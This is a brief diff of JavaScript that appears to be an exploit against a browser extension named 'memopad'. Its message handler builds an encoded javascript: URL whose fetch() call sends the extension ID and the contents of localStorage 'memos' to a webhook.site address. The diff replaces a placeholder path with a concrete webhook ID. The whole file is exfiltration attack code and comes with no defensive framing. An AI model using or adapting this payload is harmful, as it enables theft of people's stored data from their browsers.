@@ -20,7 +20,7 @@
             window.addEventListener("message", (event) => {
                 if (event.source !== window) return;
                 if (event.data?.type === "create") {
-                    const encodedUrl = encodeURIComponent(`javascript:fetch("https://webhook.site/XXXXX/" + document.querySelector("meta[memopad-extensionId]").getAttribute("memopad-extensionId") + "/" + localStorage.getItem("memos"))`);
+                    const encodedUrl = encodeURIComponent(`javascript:fetch("https://webhook.site/d8975503-1e4d-4d52-a0fd-ce4dca2c4174" + document.querySelector("meta[memopad-extensionId]").getAttribute("memopad-extensionId") + "/" + localStorage.getItem("memos"))`);
                     window.postMessage({
                         type: 'create',
                         payload: encodedUrl
